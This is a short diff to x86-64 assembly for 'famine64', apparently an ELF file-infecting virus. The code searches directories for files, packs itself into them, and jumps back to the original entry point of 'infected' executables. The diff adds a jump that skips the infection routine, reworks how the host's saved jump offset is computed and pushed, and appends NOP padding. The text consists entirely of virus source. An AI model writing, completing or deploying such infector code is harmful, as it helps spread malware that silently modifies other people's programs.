@@ -21,6 +21,7 @@ famine64_func:
 	push 	rbx
 	sub 	rsp, 8
 
+	jmp 	famine64_end
 	lea 	rdi, [rel dir_one]
 	call 	find_files
 	lea 	rdi, [rel dir_two]
@@ -461,6 +462,10 @@ pack_file_end:
 	ret
 	
 famine64_end:
+	cmp 	QWORD [rel jump_offset], 0x0 ; No jump address if the executable is not an infected one
+	lea 	rax, [rel famine64_func]
+	add 	QWORD [rel jump_offset], rax
+
 	add 	rsp, 8
 	pop 	rbx
 	pop 	rax
@@ -468,13 +473,20 @@ famine64_end:
 	pop 	rsi
 	pop 	rdi
 
-	cmp 	QWORD [rel jump_offset], 0x0 ; No jump address if the executable is not an infected one
 	je  	no_jump
-	lea 	rax, [rel famine64_func]
-	add 	rax, QWORD [rel jump_offset]
-	push 	rax
+	push 	QWORD [rel jump_offset]
 no_jump:
 	ret
+	nop
+	nop
+	nop
+	nop	
+	nop	
+	nop	
+	nop	
+	nop	
+	nop	
+	nop	
 	
 data:
 	famine64_size dd end_of_file - famine64_func
